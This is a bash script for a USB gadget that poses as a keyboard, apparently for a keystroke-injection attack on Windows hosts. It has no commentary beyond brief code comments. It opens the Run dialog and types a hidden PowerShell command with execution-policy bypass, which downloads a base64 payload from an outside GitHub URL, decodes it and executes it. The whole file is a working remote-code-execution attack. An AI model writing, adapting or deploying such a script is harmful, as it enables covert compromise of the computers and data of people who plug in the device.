#!/bin/bash

HID_DEV=/dev/hidg0

while [ ! -e $HID_DEV ]; do
  sleep 0.2
done

declare -A KEYCODES=( 
  [a]="04" [b]="05" [c]="06" [d]="07" [e]="08" [f]="09" [g]="0A" [h]="0B"
  [i]="0C" [j]="0D" [k]="0E" [l]="0F" [m]="10" [n]="11" [o]="12" [p]="13"
  [q]="14" [r]="15" [s]="16" [t]="17" [u]="18" [v]="19" [w]="1A" [x]="1B"
  [y]="1C" [z]="1D"
  [A]="04" [B]="05" [C]="06" [D]="07" [E]="08" [F]="09" [G]="0A" [H]="0B"
  [I]="0C" [J]="0D" [K]="0E" [L]="0F" [M]="10" [N]="11" [O]="12" [P]="13"
  [Q]="14" [R]="15" [S]="16" [T]="17" [U]="18" [V]="19" [W]="1A" [X]="1B"
  [Y]="1C" [Z]="1D"
  [0]="27" [1]="1E" [2]="1F" [3]="20" [4]="21" [5]="22" [6]="23" [7]="24"
  [8]="25" [9]="26"
  [" "]="2C" ["."]="37" [","]="36" ["\n"]="28" ["\r"]="28" ["/"]="38"
  ["@"]="34" ["+"]="57" ["="]="2E" [":"]="33" ["\""]="1F" 
  ["\\"]="64" ["-"]="2D" ["'"]="34" ["("]="26" [")"]="27"
  ["["]="2F" ["]"]="30"
)

declare -A MODIFIERS=(
  [a]="00" [b]="00" [c]="00" [d]="00" [e]="00" [f]="00" [g]="00" [h]="00"
  [i]="00" [j]="00" [k]="00" [l]="00" [m]="00" [n]="00" [o]="00" [p]="00"
  [q]="00" [r]="00" [s]="00" [t]="00" [u]="00" [v]="00" [w]="00" [x]="00"
  [y]="00" [z]="00"
  [A]="02" [B]="02" [C]="02" [D]="02" [E]="02" [F]="02" [G]="02" [H]="02"
  [I]="02" [J]="02" [K]="02" [L]="02" [M]="02" [N]="02" [O]="02" [P]="02"
  [Q]="02" [R]="02" [S]="02" [T]="02" [U]="02" [V]="02" [W]="02" [X]="02"
  [Y]="02" [Z]="02"
  [0]="00" [1]="00" [2]="00" [3]="00" [4]="00" [5]="00" [6]="00" [7]="00"
  [8]="00" [9]="00"
  [" "]="00" ["."]="00" [","]="00" ["\n"]="00" ["\r"]="00" ["/"]="00"
  ["@"]="02" ["+"]="02" ["="]="00" [":"]="02" ["\""]="02"
  ["\\"]="00" ["-"]="00" ["'"]="00" ["("]="02" [")"]="02"
  ["["]="00" ["]"]="00"
)

send_key() {
  # $1 = modifier, $2 = keycode
  printf "\\x$1\\x00\\x00\\x00\\x00\\x00\\x00\\x$2" > $HID_DEV
  sleep 0.00001
  printf "\x00\x00\x00\x00\x00\x00\x00\x00" > $HID_DEV
  sleep 0.00001
}

send_string() {
  local str="$1"
  local c mod code

  for ((i=0; i < ${#str}; i++)); do
    c="${str:i:1}"
    code="${KEYCODES[$c]}"
    mod="${MODIFIERS[$c]}"

    if [[ -z "$code" ]]; then
      # Unknown char: skip or add custom logic here
      continue
    fi

    send_key "$mod" "$code"
  done
}

# Construct the PowerShell command that decodes and executes base64 silently
POWERSHELL_CMD="powershell.exe -w Hidden -NoProfile -ep Bypass -Command \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/OrangeHatHacking/payloads/main/payload.b64'))))\""

# Start injecting
sleep 0.01

# Press Win+R to open Run dialog
send_key "08" "15"
sleep 0.05

# Send the PowerShell command
send_string "$POWERSHELL_CMD"
sleep 0.001

# Press Enter
send_key "00" "28"
